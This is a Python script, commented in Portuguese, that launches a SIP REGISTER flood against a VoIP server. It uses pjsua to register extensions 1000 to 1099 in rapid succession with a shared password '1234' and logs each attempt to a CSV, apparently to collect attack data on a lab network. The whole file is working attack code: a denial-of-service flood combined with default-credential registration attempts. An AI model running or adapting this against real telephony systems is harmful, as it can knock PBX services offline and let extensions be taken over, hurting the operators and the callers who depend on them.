import subprocess
import time
import csv
import os
from datetime import datetime

# Configurações
destino_ip = "192.168.0.75"
porta_sip = 5060
ramal_inicial = 1000
ramal_final = 1099
senha_ramal = "1234"
intervalo_envio = 0.05  # Intervalo entre envios em segundos
ip_local = "192.168.0.100"
porta_inicial_local = 7000  # Porta local para enviar REGISTER

# Criar pasta de resultados se não existir
os.makedirs("results", exist_ok=True)

# Função para enviar REGISTER
def enviar_register(ramal, porta_local):
    origem_uri = f"sip:{ramal}@{destino_ip}"
    comando = [
        "pjsua",
        f"--id={origem_uri}",
        f"--registrar=sip:{destino_ip}",
        "--realm=*",
        f"--username={ramal}",
        f"--password={senha_ramal}",
        f"--local-port={porta_local}",
        "--null-audio",
        "--duration=3",
        "--log-level=0",
        "--config-file=/dev/null"
    ]
    try:
        subprocess.run(comando, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except subprocess.TimeoutExpired:
        return True  # Consideramos sucesso mesmo se timeout (registro enviado)
    except Exception as e:
        print(f"❌ Erro ao registrar ramal {ramal}: {e}")
        return False

# Função para executar o flood de REGISTER
def flood_register():
    resultados = []
    print(f"\n🎯 Iniciando flood de REGISTER de {ramal_inicial} a {ramal_final}...\n")

    porta_local_atual = porta_inicial_local

    for ramal in range(ramal_inicial, ramal_final + 1):
        sucesso = enviar_register(ramal, porta_local_atual)
        status = "REGISTER Enviado" if sucesso else "Falha Envio"

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        resultados.append((ramal, status, timestamp, destino_ip, porta_sip))

        print(f"📤 REGISTER enviado para ramal {ramal} (status: {status})")

        porta_local_atual += 1
        time.sleep(intervalo_envio)

    return resultados

# Executar ataque
resultados = flood_register()

# Salvar resultados
dataset_path = "results/flood_register_resultados.csv"
with open(dataset_path, mode='w', newline='') as csvfile:
    writer = csv.writer(csvfile)
    writer.writerow(["ramal", "status", "timestamp", "destino_ip", "destino_porta"])
    for ramal, status, timestamp, ip, porta in resultados:
        writer.writerow([ramal, status, timestamp, ip, porta])

print(f"\n📂 Resultados salvos em {dataset_path}")
